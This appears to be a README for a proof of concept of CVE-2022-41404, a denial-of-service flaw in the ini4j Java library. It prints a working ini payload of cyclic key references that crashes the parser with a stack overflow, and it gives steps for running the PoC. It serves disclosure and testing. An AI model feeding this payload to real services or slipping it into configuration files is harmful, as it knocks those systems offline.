# Unpatched ini4j DoS vulnerability [CVE-2022-41404](https://nvd.nist.gov/vuln/detail/CVE-2022-41404)

A CVE was submitted to NVD on 10/11/2022, claiming that [ini4j](https://mvnrepository.com/artifact/org.ini4j/ini4j) 
*prior* to [0.5.4](https://mvnrepository.com/artifact/org.ini4j/ini4j/0.5.4) is vulnerable to a DoS attack. The ini file 
payload is

```
[sectionOne]
weight = ${sectionTwo/weight}
height = ${doc/height}

[sectionTwo]
weight = ${sectionOne/weight}
height = ${sectionOne/height}

[doc]
weight = 49.5
height = 87.7
```
If you take a look at `sectionOne`, you can note that the `weight` key references the `sectionTwo` `weight` key, 
and then references the `sectionOne` `weight` key. This infinite lookup loop results in Denial of Service. This type of
DoS can be described as a [Billion Laugh attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)

It turns out that [0.5.4](https://mvnrepository.com/artifact/org.ini4j/ini4j/0.5.4) hasn't been updated since 2015, and 
there is no fixed version.

## How to run the PoC

1. Install the ini4j dependency using maven
2. Run the main class in [Main.java](src%2Fmain%2Fjava%2Forg%2Fini4jTest%2FMain.java)
3. When trying to `fetch` the `weight` key in `sectionOne`, a StackOverFlow Exception is raised, resulting in DoS
   - `ini.get("sectionOne").fetch("weight");`
